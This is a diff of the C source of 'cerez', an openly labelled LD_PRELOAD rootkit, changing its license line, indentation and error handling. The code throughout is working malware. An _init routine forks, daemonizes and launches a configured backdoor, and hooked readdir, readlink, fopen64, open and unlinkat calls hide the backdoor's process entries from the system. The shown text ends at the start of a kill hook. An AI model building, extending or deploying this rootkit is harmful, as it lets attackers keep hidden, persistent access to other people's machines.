@@ -1,11 +1,11 @@
 /*
- * cerez | an ld_preload rootkit
+ * cerez | a ld_preload rootkit
  * ==================================
  * this project is licensed under GNU 
- * Public License Version 2 (GPLv2),
+ * Public License Version 3 (GPLv3),
  * please see the LICENSE.txt 
  *
- * written by ngn - https://ngn13.fun
+ * written by ngn - https://ngn.tf
 */
 
 // standart libaries
@@ -55,40 +55,40 @@ void _init() {
   }
  
   // we need to make sure that our 
-	// backdoor is not already running
-	// if so we can start it up
+  // backdoor is not already running
+  // if so we can start it up
   backdoor = find_proc(cfg.backdoor);
   if(backdoor.alive){
 		return;
   }
 	
-	// to start the backdoor first fork the current
-	// process creating a new child process
-	pid_t fpid = fork();
+  // to start the backdoor first fork the current
+  // process creating a new child process
+  pid_t fpid = fork();
 	
   // if pid is set to -1 it means child
-	// process creation failed
-	if (fpid == 0){	
+  // process creation failed
+  if (fpid == 0){	
 
     // if not failed, first we create a
-		// daemon, 0 means child process should
-		// change dir to root dir, the other 0 means 
-		// child processes std in/out will be redirected to /dev/null
-		daemon(0,0);
+    // daemon, 0 means child process should
+    // change dir to root dir, the other 0 means 
+    // child processes std in/out will be redirected to /dev/null
+    daemon(0,0);
 
-		// then we execute the backdoor
+    // then we execute the backdoor
     system(cfg.backdoor);
 
-		// then we just exit
-		exit(0);  
+    // then we just exit
+    exit(0);  
 
-	}
+  }
 
-	return;
+  return;
 }
 
 bool path_check(const char* pathname){
-  debug("path check!");
+  debug("running path check");
 
   // if no config then we fine
   if(strcmp(cfg.backdoor, "NONE")==0){
@@ -108,76 +108,78 @@ bool path_check(const char* pathname){
     return true;
   }
 
-  //printf("pid: %d\n", backdoor.pid_count);
   for (int i = 0; i < backdoor.pid_count; i++){
-	  char pid[30];	
-	  sprintf(pid, "%d", backdoor.pid[i]);
+    char pid[30];	
+    sprintf(pid, "%d", backdoor.pid[i]);
 
-	  if(strstr(pathname, pid)){
+    if(strstr(pathname, pid)){
       debug("check failed - process file");
       return false;
     }
   }
 
-	return true;
+  return true;
 }
 
 // malicious syscalls
 struct dirent *readdir(DIR *dirp){
   debug("readdir called!");
-  if (oreaddir == NULL){
-    debug("sex");
-  }
-	struct dirent *dp = oreaddir(dirp);
-		
-	while(dp != NULL && (!path_check(dp->d_name))){
-			dp = oreaddir(dirp);
-	}
 
-	return dp;
+  struct dirent *dp = oreaddir(dirp);	
+  while(dp != NULL && (!path_check(dp->d_name))){ 
+    dp = oreaddir(dirp);
+  }
+
+  return dp;
 }
 
 ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsiz){
   debug("readlink called!");
-	if(!path_check(pathname))
-		return -1;
+  if(!path_check(pathname)){
+    errno = ENOENT;
+    return -1;
+  }
 	
-	return oreadlink(pathname, buf, bufsiz);
+  return oreadlink(pathname, buf, bufsiz);
 }
 
 
 FILE* fopen64(const char *restrict pathname, const char *restrict mode){
   debug("fopen64 called!");
-	if(!path_check(pathname))
-		return NULL;
+  if(!path_check(pathname)){
+		errno = ENOENT;
+    return NULL;
+  }
 
-	return ofopen(pathname, mode);	
+  return ofopen(pathname, mode);	
 }
 
 int open(const char *pathname, int flags, ...){
   debug("open called!");
-	if(!path_check(pathname))
-		return -1;
+	if(!path_check(pathname)){
+    errno = ENOENT;
+    return -1;
+  }
 
-	// so you might be thinking,
-	// how do you pass the "..."	
-
+  // so you might be thinking,
+  // how do you pass the "..."	
 	// well idk
-  
-	// so i found a easier
-	// solution
+  // so i found a easier
+  // solution
 
 	// i dont
-	return oopen(pathname, flags);
+  return oopen(pathname, flags);
 	// this is probably not a good idea
 }
 
 int unlinkat(int dirfd, const char *pathname, int flags){
   debug("unlinkat called!");
-	if(!path_check(pathname))
-		return -1;
+  if(!path_check(pathname)) {
+    errno = ENOENT;
+    return -1;
+  }
 
-	return ounlinkat(dirfd, pathname, flags);
+  return ounlinkat(dirfd, pathname, flags);
 }
 
 int kill(pid_t pid, int sig){
